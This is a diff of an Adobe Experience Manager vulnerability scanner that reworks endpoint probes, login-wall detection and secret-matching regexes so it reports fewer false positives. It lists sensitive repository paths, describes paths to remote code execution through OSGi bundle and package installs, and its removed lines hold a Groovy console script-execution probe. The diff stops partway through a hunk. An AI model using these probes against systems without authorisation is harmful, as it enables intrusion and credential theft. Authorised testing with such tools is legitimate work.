@@ -165,85 +165,38 @@ AUTH_PROBE_PATHS = [
 # Each entry: (path, severity_if_exposed, category, label, signature_regex|None)
 # A signature_regex of None means 200 OK is sufficient.
 # ---------------------------------------------------------------------------
+# NOTE: admin consoles (Felix, CRXDE, Package Manager, Groovy, CRX Explorer)
+# are NOT listed here. On an author instance they return their HTML/JSP shell
+# (HTTP 200) to *everyone* — the shell is harmless, real access is gated behind
+# login. Flagging the shell as CRITICAL is a false positive. Those surfaces are
+# instead verified functionally in check_consoles(), which only fires when an
+# actual privileged operation (bundle list, package list, JCR node read)
+# succeeds. This list holds DATA endpoints, which are only flagged when they
+# return real JCR/JSON content and are NOT a login/auth-wall page.
 SENSITIVE_ENDPOINTS: List[Tuple[str, str, str, str, Optional[str]]] = [
-    # Admin consoles
-    ("/system/console",                            SEV_CRITICAL, CAT_EXPOSURE,  "Apache Felix OSGi Web Console exposed",        r"(Apache Felix Web Console|OSGi Management Console)"),
-    ("/system/console/bundles",                    SEV_CRITICAL, CAT_EXPOSURE,  "Felix OSGi bundles console exposed",            r"(Bundles|Apache Felix)"),
-    ("/system/console/configMgr",                  SEV_CRITICAL, CAT_EXPOSURE,  "Felix OSGi ConfigMgr console exposed",          r"(Configuration|Apache Felix)"),
-    ("/system/console/components",                 SEV_HIGH,     CAT_EXPOSURE,  "Felix OSGi components console exposed",         r"(Component|Apache Felix)"),
-    ("/system/console/status-slingsettings",       SEV_HIGH,     CAT_DISCLOSURE,"Sling Settings status page exposed",            r"(Sling Settings|sling\.id|sling\.run\.modes)"),
-    ("/system/console/jmx",                        SEV_HIGH,     CAT_EXPOSURE,  "Felix JMX bridge exposed",                       r"(JMX|MBean)"),
-    ("/system/console/profiler",                   SEV_HIGH,     CAT_EXPOSURE,  "Sling Profiler exposed",                         r"(Profiler|sling)"),
-    ("/system/console/depfinder",                  SEV_MEDIUM,   CAT_DISCLOSURE,"Felix Dependency Finder exposed",                r"(Dependency Finder|Apache Felix)"),
-    ("/system/console/healthcheck",                SEV_MEDIUM,   CAT_DISCLOSURE,"Sling Healthcheck console exposed",              r"(Health[Cc]heck)"),
-    # CRX
-    ("/crx/de/index.jsp",                          SEV_CRITICAL, CAT_EXPOSURE,  "CRXDE Lite IDE exposed (full JCR write)",       r"(CRXDE|Adobe Granite)"),
-    ("/crx/de/",                                   SEV_CRITICAL, CAT_EXPOSURE,  "CRXDE Lite exposed",                             r"(CRXDE|Granite)"),
-    ("/crx/packmgr/index.jsp",                     SEV_CRITICAL, CAT_EXPOSURE,  "CRX Package Manager exposed",                    r"(Package Manager|CRX)"),
-    ("/crx/packmgr/service.jsp",                   SEV_CRITICAL, CAT_EXPOSURE,  "CRX Package Manager service endpoint exposed",   None),
-    ("/crx/packmgr/service/.json",                 SEV_HIGH,     CAT_EXPOSURE,  "CRX Package Manager JSON service exposed",       None),
-    ("/crx/packmgr/list.jsp",                      SEV_HIGH,     CAT_EXPOSURE,  "CRX Package list endpoint exposed",              None),
-    ("/crx/explorer/index.jsp",                    SEV_HIGH,     CAT_EXPOSURE,  "CRX Explorer exposed",                           r"(Content Explorer|CRX)"),
-    ("/crx/explorer/browser/index.jsp",            SEV_HIGH,     CAT_EXPOSURE,  "CRX Browser exposed",                            r"(CRX|Browser)"),
-    ("/crx/explorer/diagnostic/diagnostic.jsp",    SEV_MEDIUM,   CAT_DISCLOSURE,"CRX diagnostic page exposed",                    None),
-    ("/crx/repository/crx.default",                SEV_HIGH,     CAT_EXPOSURE,  "CRX WebDAV root exposed",                        r"(WebDAV|MKCOL|PROPFIND)"),
-    ("/crx/server/crx.default/jcr%3aroot",         SEV_HIGH,     CAT_EXPOSURE,  "CRX JCR server root exposed",                    None),
-    # Author UI / login fingerprints
-    ("/libs/granite/core/content/login.html",      SEV_INFO,     CAT_FINGERPRINT,"AEM login page reachable",                       r"(QUICKSTART|Adobe Experience Manager|granite)"),
-    ("/libs/cq/core/content/welcome.html",         SEV_INFO,     CAT_FINGERPRINT,"AEM welcome page reachable",                     r"(Welcome|AEM)"),
-    ("/aem/start.html",                            SEV_INFO,     CAT_FINGERPRINT,"AEM start page reachable",                       r"(start|AEM|granite)"),
-    # Groovy
-    ("/bin/groovyconsole",                         SEV_CRITICAL, CAT_RCE,       "Groovy Console exposed (RCE)",                   r"(Groovy|Console)"),
-    ("/bin/groovyconsole.html",                    SEV_CRITICAL, CAT_RCE,       "Groovy Console UI exposed (RCE)",                r"(Groovy|Console)"),
-    ("/etc/groovyconsole.html",                    SEV_CRITICAL, CAT_RCE,       "Legacy Groovy Console (etc) exposed (RCE)",      r"(Groovy)"),
-    # WCM / authoring
-    ("/bin/wcmcommand",                            SEV_MEDIUM,   CAT_EXPOSURE,  "Sling WCM command endpoint exposed",             None),
-    ("/bin/wcm/contentfinder/page/view.json",      SEV_MEDIUM,   CAT_DISCLOSURE,"Content Finder JSON exposed",                    None),
-    ("/bin/receive",                               SEV_MEDIUM,   CAT_EXPOSURE,  "Sling receive endpoint exposed",                 None),
-    # Reports / forms
-    ("/etc/reports.html",                          SEV_LOW,      CAT_EXPOSURE,  "AEM Reports console exposed",                    None),
-    ("/etc/workflow.html",                         SEV_LOW,      CAT_EXPOSURE,  "AEM Workflow console exposed",                   None),
-    # Sling / Authorizables
-    ("/libs/granite/security/userinfo.json",       SEV_LOW,      CAT_DISCLOSURE,"Current user info endpoint exposed",             r"\"userID\""),
-    ("/libs/granite/security/currentuser.json",    SEV_LOW,      CAT_DISCLOSURE,"Current user endpoint exposed",                  r"\"home\""),
-    ("/libs/cq/security/userinfo.json",            SEV_LOW,      CAT_DISCLOSURE,"Legacy user info endpoint exposed",              r"\"userID\""),
-    ("/libs/cq/security/content/admin/groups.json",SEV_HIGH,     CAT_DISCLOSURE,"Group admin JSON exposed",                       r"(groups|administrators)"),
-    ("/libs/cq/security/post/authorizables.json",  SEV_HIGH,     CAT_DISCLOSURE,"Authorizables endpoint exposed",                 r"(authorizable|users)"),
-    # Replication / packages / etc
-    ("/etc/replication.json",                      SEV_HIGH,     CAT_DISCLOSURE,"Replication agents config exposed",              r"(transportUri|replication)"),
-    ("/etc/replication/agents.author.json",        SEV_HIGH,     CAT_DISCLOSURE,"Author replication agents exposed",              None),
-    ("/etc/replication/agents.publish.json",       SEV_HIGH,     CAT_DISCLOSURE,"Publish replication agents exposed",             None),
-    ("/etc/packages.json",                         SEV_MEDIUM,   CAT_DISCLOSURE,"Packages listing exposed",                       None),
-    # Cloud services — high value: can leak AWS/Salesforce/Marketo keys
-    ("/etc/cloudservices.json",                    SEV_HIGH,     CAT_DISCLOSURE,"Cloud services config exposed",                  None),
-    ("/etc/cloudservices.infinity.json",           SEV_CRITICAL, CAT_DISCLOSURE,"Cloud services credentials may leak",            None),
-    ("/etc/cloudsettings.json",                    SEV_MEDIUM,   CAT_DISCLOSURE,"Cloud settings exposed",                         None),
-    ("/etc/key.json",                              SEV_HIGH,     CAT_DISCLOSURE,"Encryption key node exposed",                    None),
-    # Linkchecker (SSRF primitive)
-    ("/libs/wcm/resources/linkchecker.json",       SEV_MEDIUM,   CAT_SSRF,      "External Link Checker reachable",                None),
-    ("/etc/linkchecker.html",                      SEV_LOW,      CAT_EXPOSURE,  "Link Checker config page exposed",               None),
-    # Forms (JEE) — CVE 2025 surface
-    ("/adminui/debug",                             SEV_CRITICAL, CAT_RCE,       "AEM Forms JEE debug console exposed (CVE-2025-54253)", None),
-    ("/adminui",                                   SEV_HIGH,     CAT_EXPOSURE,  "AEM Forms JEE admin UI exposed",                 None),
-    ("/lc/system/console",                         SEV_CRITICAL, CAT_EXPOSURE,  "LiveCycle admin console exposed",                None),
-    ("/lc/libs/granite/core/content/login.html",   SEV_INFO,     CAT_FINGERPRINT,"LiveCycle login page reachable",                  None),
-    # Dispatcher info / debug
-    ("/dispatcher/invalidate.cache",               SEV_HIGH,     CAT_MISCONFIG, "Dispatcher invalidation endpoint reachable",     None),
-    # GraphQL (newer AEM)
-    ("/content/graphql/global/endpoint.json",      SEV_LOW,      CAT_EXPOSURE,  "AEM GraphQL endpoint reachable",                 None),
-    ("/content/cq:graphql/global/endpoint.json",   SEV_LOW,      CAT_EXPOSURE,  "AEM GraphQL legacy endpoint reachable",          None),
-    # Misc
-    ("/etc/clientlibs.json",                       SEV_LOW,      CAT_DISCLOSURE,"clientlibs tree exposed",                        None),
-    ("/etc/designs.json",                          SEV_LOW,      CAT_DISCLOSURE,"designs tree exposed",                           None),
-    ("/var/audit.json",                            SEV_MEDIUM,   CAT_DISCLOSURE,"Audit log path exposed",                         None),
-    ("/var.json",                                  SEV_LOW,      CAT_DISCLOSURE,"/var root JSON exposed",                         None),
-    ("/tmp.json",                                  SEV_LOW,      CAT_DISCLOSURE,"/tmp root JSON exposed",                         None),
-    ("/home.json",                                 SEV_LOW,      CAT_DISCLOSURE,"/home root JSON exposed",                        None),
-    ("/home/users.1.json",                         SEV_HIGH,     CAT_DISCLOSURE,"User listing JSON exposed",                      r"(rep:User|jcr:primaryType)"),
-    ("/home/groups.1.json",                        SEV_HIGH,     CAT_DISCLOSURE,"Group listing JSON exposed",                     r"(rep:Group|jcr:primaryType)"),
-    ("/etc.1.json",                                SEV_MEDIUM,   CAT_DISCLOSURE,"/etc JSON exposed",                              None),
-    ("/apps.1.json",                               SEV_MEDIUM,   CAT_DISCLOSURE,"/apps JSON exposed",                             None),
-    ("/libs.json",                                 SEV_LOW,      CAT_DISCLOSURE,"/libs root JSON exposed",                        None),
+    # --- High-value config / credential trees (only if real JCR JSON comes back) ---
+    ("/etc/replication.json",                      SEV_HIGH,   CAT_DISCLOSURE, "Replication agents config readable",          r"(transportUri|agentClass|jcr:primaryType)"),
+    ("/etc/replication/agents.author.json",        SEV_HIGH,   CAT_DISCLOSURE, "Author replication agents readable",          r"(transportUri|jcr:primaryType)"),
+    ("/etc/replication/agents.publish.json",       SEV_HIGH,   CAT_DISCLOSURE, "Publish replication agents readable",         r"(transportUri|jcr:primaryType)"),
+    ("/etc/cloudservices.infinity.json",           SEV_HIGH,   CAT_DISCLOSURE, "Cloud services tree readable",                r"jcr:primaryType"),
+    ("/etc/key.json",                              SEV_HIGH,   CAT_DISCLOSURE, "Crypto key node readable",                    r"jcr:primaryType"),
+    # --- User / group enumeration (need real authorizable content) ---
+    ("/home/users.1.json",                         SEV_HIGH,   CAT_DISCLOSURE, "User tree readable",                          r"(rep:User|rep:authorizableId|rep:principalName)"),
+    ("/home/groups.1.json",                        SEV_HIGH,   CAT_DISCLOSURE, "Group tree readable",                         r"(rep:Group|rep:principalName)"),
+    ("/libs/cq/security/content/admin/groups.json",SEV_MEDIUM, CAT_DISCLOSURE, "Group admin JSON readable",                   r"(authorizableId|administrators)"),
+    # --- Packages / audit ---
+    ("/etc/packages.json",                         SEV_MEDIUM, CAT_DISCLOSURE, "Packages tree readable",                      r"jcr:primaryType"),
+    ("/var/audit.json",                            SEV_MEDIUM, CAT_DISCLOSURE, "Audit log tree readable",                     r"jcr:primaryType"),
+    # --- SSRF surface (reachability only; SSRF module confirms exploitability) ---
+    ("/libs/wcm/resources/linkchecker.json",       SEV_LOW,    CAT_SSRF,       "External Link Checker reachable",             None),
+    # --- Forms JEE admin (CVE module confirms /adminui/debug separately) ---
+    ("/adminui",                                   SEV_MEDIUM, CAT_EXPOSURE,   "AEM Forms JEE admin UI reachable",            None),
+    # --- GraphQL ---
+    ("/content/graphql/global/endpoint.json",      SEV_LOW,    CAT_EXPOSURE,   "AEM GraphQL endpoint reachable",              None),
+    # --- Default-readable framework trees: INFO only (common, low value) ---
+    ("/etc.1.json",                                SEV_INFO,   CAT_DISCLOSURE, "/etc tree readable",                          r"jcr:primaryType"),
+    ("/conf.1.json",                               SEV_INFO,   CAT_DISCLOSURE, "/conf tree readable",                         r"jcr:primaryType"),
+    ("/apps.1.json",                               SEV_INFO,   CAT_DISCLOSURE, "/apps tree readable",                         r"jcr:primaryType"),
 ]
 
 # ---------------------------------------------------------------------------
@@ -334,6 +287,30 @@ RE_AEM_HEADERS = re.compile(r"(?i)(serv(er|let-engine).*sling|day-)|cq[-_]|adobe
 RE_AEM_BODY = re.compile(r"(?i)(granite|Adobe Experience Manager|Sling|/etc/clientlibs/|CQ\.WCM|cq\.shared|CRXDE)")
 RE_AUTHOR_HINT = re.compile(r"(?i)(touch-ui|cq\.authoring|authoringUI|x-author)")
 RE_PUBLISH_HINT = re.compile(r"(?i)(publish-only|x-publish|dispatcher)")
+
+# A 200 response that is really a login / auth wall. Used everywhere to avoid
+# the #1 AEM false positive: console *shells* render to anonymous users while
+# the actual functionality stays gated behind login.
+RE_LOGIN = re.compile(
+    r"(?i)("
+    r"j_security_check|j_username|j_password|"
+    r"granite\.shell\.login|granite/core/content/login|"
+    r"coral-?Login|login-box|cq-Login|loginform|loginpage|"
+    r"QUICKSTART|"
+    r"<title>[^<]*sign\s*in|please\s+log\s*in|authentication required|"
+    r"id=[\"']username[\"']|name=[\"']j_username[\"']|name=[\"']pwd[\"']"
+    r")"
+)
+# Body actually contains secret-like material -> upgrade severity.
+RE_SECRET = re.compile(
+    r"(?i)("
+    r"\"?password\"?\s*[:=]\s*[\"'][^\"']+|"
+    r"\"?pwd\"?\s*[:=]\s*[\"'][^\"']+|"
+    r"access[_-]?key|secret[_-]?(key|access)|private[_-]?key|"
+    r"aws[_-]?(secret|access)|api[_-]?key\"?\s*[:=]|client[_-]?secret|"
+    r"-----BEGIN [A-Z ]*PRIVATE KEY-----"
+    r")"
+)
 
 # ---------------------------------------------------------------------------
 # Logger
@@ -673,6 +650,56 @@ class AEMHunter:
             return True
         return name in self.enable_modules
 
+    # ---- auth-wall detection ----
+    def _is_authwall(self, r) -> bool:
+        """True if the response is really a login page / auth redirect / 401 / 403.
+
+        This is the core false-positive killer: AEM happily serves console HTML
+        shells (CRXDE, Package Manager, Felix, etc.) to anonymous users, then
+        gates the actual functionality behind login. A 200 that is just the
+        login page must NOT be treated as access.
+        """
+        if r is None:
+            return True
+        if r.status_code in (401, 403):
+            return True
+        if 300 <= r.status_code < 400:
+            loc = (r.headers.get("Location") or "").lower()
+            return any(k in loc for k in ("login", "signin", "sign-in", "sso", "/saml", "auth"))
+        # 200 (or other 2xx) — scan a bounded prefix for login markers. Large
+        # genuine JCR dumps won't contain these, so this is safe.
+        try:
+            body = r.text or ""
+        except Exception:
+            return False
+        return bool(RE_LOGIN.search(body[:16000]))
+
+    def _role_tag(self) -> str:
+        return f"({self.role})" if self.role else "(anonymous)"
+
+    def _who(self) -> str:
+        return f"as {self.role}" if self.role else "anonymously"
+
+    @staticmethod
+    def _looks_like_backend_data(body: str) -> bool:
+        """True only if the body looks like a real AEM servlet response (JCR JSON,
+        QueryBuilder result, OSGi inventory, etc.) rather than a generic page."""
+        if not body:
+            return False
+        bl = body.lstrip()
+        low = body.lower()
+        if bl[:1] in ("{", "["):
+            return any(m in low for m in (
+                '"success"', '"hits"', '"results"', '"total"',
+                "jcr:primarytype", "symbolicname", '"authorizableid"',
+                "rep:user", "rep:group", '"stateraw"',
+            ))
+        if "<?xml" in bl[:64]:
+            return any(m in low for m in ("<feed", "<result", "querybuilder", "<crx"))
+        if "apache felix" in low or "crxde lite" in low:
+            return True
+        return False
+
     # =======================================================================
     # 1. Fingerprinting
     # =======================================================================
@@ -792,50 +819,173 @@ class AEMHunter:
                 ))
 
     # =======================================================================
-    # 3. Exposed endpoint probe
+    # 3. Exposed DATA-endpoint probe (consoles handled by check_consoles)
     # =======================================================================
     def check_exposed_endpoints(self) -> None:
         if not self._enabled("exposure"):
             return
-        self.logger.section("Exposed endpoint probe")
+        self.logger.section("Exposed data-endpoint probe")
 
         def probe(entry):
             path, sev, cat, label, sig = entry
             r = self.client.get(path)
-            if r is None:
+            if r is None or r.status_code != 200:
                 return
-            if r.status_code not in (200, 401, 403):
-                # Even 401 / 403 of /crx/de or /system/console is "exists",
-                # but for noise control we only flag 200s by default.
+            # The big one: suppress login pages / auth redirects masquerading as 200.
+            if self._is_authwall(r):
+                self.logger.debug(f"{path}: login/auth wall -> suppressed")
                 return
             body = safe_response_text(r, 8000)
-            if r.status_code == 200:
-                if sig and not re.search(sig, body, re.I):
-                    # 200 but not the expected signature — likely a soft 404
+            # JSON endpoints must actually return JSON (not an HTML shell).
+            bare = path.split("?", 1)[0]
+            if bare.endswith(".json"):
+                s = body.lstrip()
+                if not (s.startswith("{") or s.startswith("[")):
                     return
-                self.reporter.add(Finding(
-                    title=label,
-                    severity=sev, category=cat, target=self.target + path,
-                    evidence=f"HTTP 200, content-length {len(r.content)}",
-                    description=f"Endpoint {path} returned 200 without authentication.",
-                    request=self.client.request_signature("GET", path),
-                    response_snippet=snippet(body, 600),
-                    role=self.role,
-                ))
-            elif r.status_code in (401, 403) and sig:
-                # only flag 401/403 if signature still appears in the body
-                if re.search(sig, body, re.I):
-                    self.reporter.add(Finding(
-                        title=f"{label} (auth-gated but reachable)",
-                        severity=SEV_LOW, category=cat, target=self.target + path,
-                        evidence=f"HTTP {r.status_code}, signature matched",
-                        description=f"Endpoint {path} is reachable but auth-gated. "
-                                    "Re-test after capturing valid session cookies.",
-                        role=self.role,
-                    ))
+                if s in ("{}", "[]"):
+                    return  # empty == no access / nothing to see
+            if sig and not re.search(sig, body, re.I):
+                # 200 but not the expected content signature — soft 404 / wrong page.
+                return
+            eff = sev
+            extra = ""
+            if RE_SECRET.search(body):
+                eff = SEV_CRITICAL
+                extra = " — response contains secret-like values"
+            self.reporter.add(Finding(
+                title=label + extra,
+                severity=eff, category=cat, target=self.target + path,
+                evidence=f"HTTP 200, {len(r.content)} bytes, readable {self._who()} (not a login page)",
+                description=(f"{path} returned real content {self._who()}. "
+                             "Verified it is not a login/auth-wall response."),
+                request=self.client.request_signature("GET", path),
+                response_snippet=snippet(body, 600),
+                role=self.role,
+            ))
 
         with cf.ThreadPoolExecutor(max_workers=self.threads) as ex:
             list(ex.map(probe, SENSITIVE_ENDPOINTS))
+
+    # =======================================================================
+    # 3b. Privileged console access — verified FUNCTIONALLY, not by shell HTML.
+    # =======================================================================
+    def check_consoles(self) -> None:
+        if not self._enabled("exposure"):
+            return
+        self.logger.section("Privileged console access verification")
+
+        felix_ok = self._verify_felix()
+        pkg_ok = self._verify_packmgr()
+        repo_ok = self._verify_repo_read()
+
+        # Shells that merely render (200, not a login page) but where no
+        # privileged operation succeeded -> single INFO each, so you know to
+        # retry with role cookies. No more false CRITICALs.
+        gated = [
+            ("/system/console", "Felix OSGi console", felix_ok),
+            ("/crx/de/index.jsp", "CRXDE Lite", repo_ok),
+            ("/crx/packmgr/index.jsp", "CRX Package Manager", pkg_ok),
+            ("/crx/explorer/index.jsp", "CRX Explorer", repo_ok),
+            ("/bin/groovyconsole.html", "Groovy Console", False),  # RCE proof is in check_groovy_console
+        ]
+        for path, name, proven in gated:
+            if proven:
+                continue
+            r = self.client.get(path)
+            if r is None or r.status_code != 200 or self._is_authwall(r):
+                continue
+            self.reporter.add(Finding(
+                title=f"{name} shell loads but no privileged access {self._who()}",
+                severity=SEV_INFO, category=CAT_EXPOSURE, target=self.target + path,
+                evidence="Console HTML shell returned; backend operations were NOT confirmed accessible.",
+                description=("This is the AEM console SHELL, which renders for anyone — it is "
+                             "NOT proof of access. No privileged operation succeeded here. "
+                             "Re-test with authenticated role cookies; a low-privilege session "
+                             "that can actually drive this console would be the real finding."),
+                role=self.role,
+            ))
+
+    def _verify_felix(self) -> bool:
+        """Functional proof: bundles.json returns the live OSGi inventory."""
+        r = self.client.get("/system/console/bundles.json")
+        if r is None or r.status_code != 200 or self._is_authwall(r):
+            return False
+        b = r.text or ""
+        if ('"data"' in b or '"s"' in b) and ("symbolicName" in b or "stateRaw" in b or "fragment" in b):
+            self.reporter.add(Finding(
+                title=f"Felix OSGi console accessible {self._role_tag()} — RCE via bundle install",
+                severity=SEV_CRITICAL, category=CAT_RCE,
+                target=self.target + "/system/console/bundles.json",
+                evidence="bundles.json returned the live OSGi bundle inventory (functional access, not a shell).",
+                description=("The Felix OSGi web console is functionally reachable. Installing a "
+                             "malicious OSGi bundle via /system/console/bundles yields OS-level "
+                             "RCE as the AEM service user."),
+                references=["https://github.com/0ang3el/aem-rce-bundle"],
+                request=self.client.request_signature("GET", "/system/console/bundles.json"),
+                response_snippet=snippet(b, 500),
+                role=self.role,
+            ))
+            return True
+        return False
+
+    def _verify_packmgr(self) -> bool:
+        """Functional proof: package service returns an actual package listing."""
+        for p in ("/crx/packmgr/service.jsp?cmd=ls",
+                  "/crx/packmgr/list.jsp?_charset_=utf-8",
+                  "/crx/packmgr/service/.json?cmd=ls"):
+            r = self.client.get(p)
+            if r is None or r.status_code != 200 or self._is_authwall(r):
+                continue
+            b = r.text or ""
+            if any(k in b for k in ("downloadName", "<package>", "buildCount",
+                                    '"packages"', '"pages"', "<crx version")):
+                self.reporter.add(Finding(
+                    title=f"CRX Package Manager accessible {self._role_tag()} — RCE via package install",
+                    severity=SEV_CRITICAL, category=CAT_RCE,
+                    target=self.target + p,
+                    evidence="Package service returned a real package listing (functional access).",
+                    description=("Package Manager is functionally reachable. Build/upload a content "
+                                 "package containing a malicious OSGi bundle or JSP and install it "
+                                 "for code execution."),
+                    references=["https://book.hacktricks.xyz/pentesting/pentesting-web/adobe-experience-manager-aem"],
+                    request=self.client.request_signature("GET", p),
+                    response_snippet=snippet(b, 500),
+                    role=self.role,
+                ))
+                return True
+        return False
+
+    def _verify_repo_read(self) -> bool:
+        """Functional proof: a JCR node that should be ACL-protected is readable.
+
+        This is the substance behind 'CRXDE access' — being able to read the
+        repository. The CRXDE *shell* alone proves nothing.
+        """
+        candidates = [
+            ("/crx/server/crx.default/jcr:root/.1.json", SEV_HIGH,   "Anonymous JCR read via CRX server"),
+            ("/.1.json",                                 SEV_HIGH,   "Repository root readable"),
+            ("/var.1.json",                              SEV_MEDIUM, "/var readable"),
+        ]
+        for path, sev, label in candidates:
+            r = self.client.get(path)
+            if r is None or r.status_code != 200 or self._is_authwall(r):
+                continue
+            b = (r.text or "").lstrip()
+            if b.startswith("{") and "jcr:primaryType" in b:
+                eff = SEV_CRITICAL if RE_SECRET.search(b) else sev
+                self.reporter.add(Finding(
+                    title=f"{label} {self._role_tag()}",
+                    severity=eff, category=CAT_JCR, target=self.target + path,
+                    evidence=f"Returned JCR JSON ({len(r.content)} bytes) {self._who()}.",
+                    description=("The JCR repository is readable without the expected "
+                                 "authorization. Enumerate users, configs and content from "
+                                 "here — this is what makes CRXDE access dangerous."),
+                    request=self.client.request_signature("GET", path),
+                    response_snippet=snippet(r.text, 600),
+                    role=self.role,
+                ))
+                return True
+        return False
 
     # =======================================================================
     # 4. Dispatcher bypass fuzzing
@@ -872,35 +1022,36 @@ class AEMHunter:
                 else:
                     fuzzed = f"{path}{suffix}"
                 r = self.client.get(fuzzed)
-                if r is None:
+                if r is None or r.status_code != 200 or len(r.content) <= 50:
                     continue
-                if r.status_code == 200 and len(r.content) > 50:
-                    body = safe_response_text(r, 2000)
-                    # Sanity check that the body looks like the real backend response,
-                    # not a 200-OK landing page returned by some proxies.
-                    if any(s in body.lower() for s in ("granite", "sling", "querybuilder",
-                                                       "felix", "crxde", "groovy",
-                                                       "jcr:primarytype", "userid")):
-                        self.reporter.add(Finding(
-                            title=f"Dispatcher bypass: {label} via suffix '{suffix}'",
-                            severity=sev, category=CAT_DISPATCHER,
-                            target=self.target + fuzzed,
-                            evidence=f"Baseline {baseline} -> bypass 200 ({len(r.content)} bytes)",
-                            description=("The dispatcher allowed an unauthenticated request to "
-                                         f"{path} when the suffix '{suffix}' was appended. The "
-                                         "backend Sling resource resolver ignored the suffix and "
-                                         "served the original servlet response."),
-                            references=[
-                                "https://labs.withsecure.com/advisories/adobe-experience-manager-dispatcher-bypass",
-                                "https://blog.assetnote.io/",
-                                "https://book.hacktricks.xyz/pentesting/pentesting-web/adobe-experience-manager-aem",
-                            ],
-                            request=self.client.request_signature("GET", fuzzed),
-                            response_snippet=snippet(body, 600),
-                            role=self.role,
-                        ))
-                        # one hit per endpoint is enough — move on
-                        return
+                # A login page also returns 200 and contains "granite" — skip it.
+                if self._is_authwall(r):
+                    continue
+                body = safe_response_text(r, 2000)
+                # Require a STRONG backend-data signature, not just a generic word.
+                if not self._looks_like_backend_data(body):
+                    continue
+                self.reporter.add(Finding(
+                    title=f"Dispatcher bypass: {label} via suffix '{suffix}'",
+                    severity=sev, category=CAT_DISPATCHER,
+                    target=self.target + fuzzed,
+                    evidence=f"Baseline {baseline} -> bypass 200 ({len(r.content)} bytes) with backend data",
+                    description=("The dispatcher allowed an unauthenticated request to "
+                                 f"{path} when the suffix '{suffix}' was appended. The "
+                                 "backend Sling resource resolver ignored the suffix and "
+                                 "served the original servlet response (confirmed by "
+                                 "real backend data, not a login page)."),
+                    references=[
+                        "https://labs.withsecure.com/advisories/adobe-experience-manager-dispatcher-bypass",
+                        "https://blog.assetnote.io/",
+                        "https://book.hacktricks.xyz/pentesting/pentesting-web/adobe-experience-manager-aem",
+                    ],
+                    request=self.client.request_signature("GET", fuzzed),
+                    response_snippet=snippet(body, 600),
+                    role=self.role,
+                ))
+                # one hit per endpoint is enough — move on
+                return
 
         with cf.ThreadPoolExecutor(max_workers=self.threads) as ex:
             list(ex.map(fuzz, DISPATCHER_TARGETS))
@@ -924,6 +1075,8 @@ class AEMHunter:
             r = self.client.get(path)
             if r is None or r.status_code != 200:
                 return
+            if self._is_authwall(r):
+                return
             body = safe_response_text(r, 4000)
             if not body or len(body) < 30:
                 return
@@ -937,6 +1090,8 @@ class AEMHunter:
                     stripped = body.lstrip()
                     if not (stripped.startswith("{") or stripped.startswith("[")):
                         return
+                    if stripped in ("{}", "[]"):
+                        return
                     if "jcr:" not in body and "sling:" not in body and "rep:" not in body:
                         return
             except Exception:
@@ -947,17 +1102,22 @@ class AEMHunter:
             if root in ("/etc/cloudservices", "/etc/replication", "/etc/key",
                         "/home/users", "/home/groups"):
                 sev = SEV_HIGH
-            # Look for likely credentials
-            if re.search(r"(?i)(password|secret|access[_-]?key|token|aws|salesforce)", body):
+            # /libs and /apps are world-readable by default on most installs:
+            # framework code, low value. Keep them as INFO to cut noise.
+            if root in ("/libs", "/apps") or root.startswith(("/libs/", "/apps/")):
+                sev = SEV_INFO
+            # Look for likely credentials -> upgrade.
+            if RE_SECRET.search(body) or re.search(r"(?i)(\"password\"|access[_-]?key|aws_secret|salesforce.*secret)", body):
                 sev = SEV_CRITICAL
 
             self.reporter.add(Finding(
                 title=f"Sling info disclosure at {path}",
                 severity=sev, category=CAT_JCR, target=self.target + path,
-                evidence=f"HTTP 200, content-length {len(r.content)}",
-                description=("Sling selector served JCR node tree contents to an "
-                             "unauthenticated request. Use this to enumerate users, "
-                             "groups, replication agents and cloud-service configs."),
+                evidence=f"HTTP 200, content-length {len(r.content)}, readable {self._who()}",
+                description=("Sling selector served JCR node tree contents to a "
+                             f"request {self._who()} (verified not a login page). Use this "
+                             "to enumerate users, groups, replication agents and "
+                             "cloud-service configs."),
                 references=[
                     "https://experienceleague.adobe.com/docs/experience-manager-65/developing/introduction/sling-cheatsheet.html",
                     "https://github.com/0ang3el/aem-hacker",
@@ -992,21 +1152,32 @@ class AEMHunter:
         ]
         for p in qb_paths:
             r = self.client.get(p)
-            if r is None:
+            if r is None or r.status_code != 200:
                 continue
-            if r.status_code == 200:
-                body = safe_response_text(r, 4000)
-                if not re.search(r"(?i)(success|hits|results|total)", body):
+            if self._is_authwall(r):
+                continue
+            body = safe_response_text(r, 4000)
+            stripped = body.lstrip()
+            if p.endswith(".xml"):
+                # QueryBuilder feed
+                if "<?xml" not in stripped[:64] or not re.search(r"(?i)(querybuilder|<feed|<result)", body):
                     continue
-                sev = SEV_HIGH
-                if "/home/users" in p or "type=rep:User" in p:
-                    sev = SEV_CRITICAL
-                if "/etc/cloudservices" in p:
-                    sev = SEV_CRITICAL
+            else:
+                # Must be a real QueryBuilder JSON result, not an HTML page.
+                if not stripped.startswith("{"):
+                    continue
+                if '"success"' not in body and '"hits"' not in body and '"results"' not in body:
+                    continue
+            sev = SEV_HIGH
+            if "/home/users" in p or "type=rep:User" in p:
+                sev = SEV_CRITICAL
+            if "/etc/cloudservices" in p:
+                sev = SEV_CRITICAL
+            if True:
                 self.reporter.add(Finding(
                     title=f"QueryBuilder API exposed: {p}",
                     severity=sev, category=CAT_DISCLOSURE, target=self.target + p,
-                    evidence=f"HTTP 200 | {len(r.content)} bytes | matched 'success/hits'",
+                    evidence=f"HTTP 200 | {len(r.content)} bytes | valid QueryBuilder result {self._who()}",
                     description=("/bin/querybuilder.json is reachable unauthenticated. "
                                  "Iterate p.offset + p.limit to enumerate the entire JCR "
                                  "or filter by type (rep:User, cq:Page, dam:Asset)."),
@@ -1030,43 +1201,47 @@ class AEMHunter:
         for p in ("/bin/groovyconsole", "/bin/groovyconsole.html",
                   "/etc/groovyconsole.html"):
             r = self.client.get(p)
-            if r is None:
+            if r is None or r.status_code != 200:
                 continue
-            if r.status_code == 200 and "Groovy" in (r.text or ""):
-                # Try an actual RCE probe (echo-only, no system commands)
-                payload = "out.println('AEM-HUNTER-CANARY-' + System.getProperty('user.name'))"
-                rce = self.client.post("/bin/groovyconsole/post.json",
-                                       data={"script": payload})
-                if rce is not None and "AEM-HUNTER-CANARY" in (rce.text or ""):
-                    self.reporter.add(Finding(
-                        title="Groovy Console RCE confirmed",
-                        severity=SEV_CRITICAL, category=CAT_RCE,
-                        target=self.target + "/bin/groovyconsole/post.json",
-                        evidence="Canary echo via Groovy executed unauthenticated.",
-                        description=("ACS Commons Groovy Console is enabled and reachable. "
-                                     "Posting a script to /bin/groovyconsole/post.json gives "
-                                     "instant OS-level RCE as the AEM service user."),
-                        references=[
